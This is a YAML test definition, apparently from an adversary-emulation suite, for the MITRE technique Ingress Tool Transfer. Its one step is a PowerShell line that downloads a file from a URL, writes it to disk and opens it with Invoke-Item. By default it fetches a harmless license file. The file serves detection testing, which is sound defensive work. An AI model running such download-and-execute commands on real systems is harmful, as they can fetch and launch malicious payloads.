api_version: "2.0"
name: File Download via PowerShell
description: |
    Use PowerShell to download and write an arbitrary file from the internet. Example is from the 2021 Threat Detection Report by Red Canary.
args:
    - name: target_remote_file
      type: url
      default: https://raw.githubusercontent.com/redcanaryco/atomic-red-team/4042cb3433bce024e304500dcfe3c5590571573a/LICENSE.txt
    - name: output_file
      type: string
      default: LICENSE.txt
uuid: 54a4daf1-71df-4383-9ba7-f1a295d8b6d2
mitre:
    tactics:
        - 'TA0011: Command and Control'
    techniques:
        - 'T1105: Ingress Tool Transfer'
requirements:
    platforms:
        - os: windows
steps:
    - name: file-download-via-powershell
      inline: |
        (New-Object Net.WebClient).DownloadString('{{.Args.target_remote_file}}') | Out-File {{.Args.output_file}}; Invoke-Item {{.Args.output_file}}
      executor: powershell
      cleanup:
        inline: ""
        executor: powershell
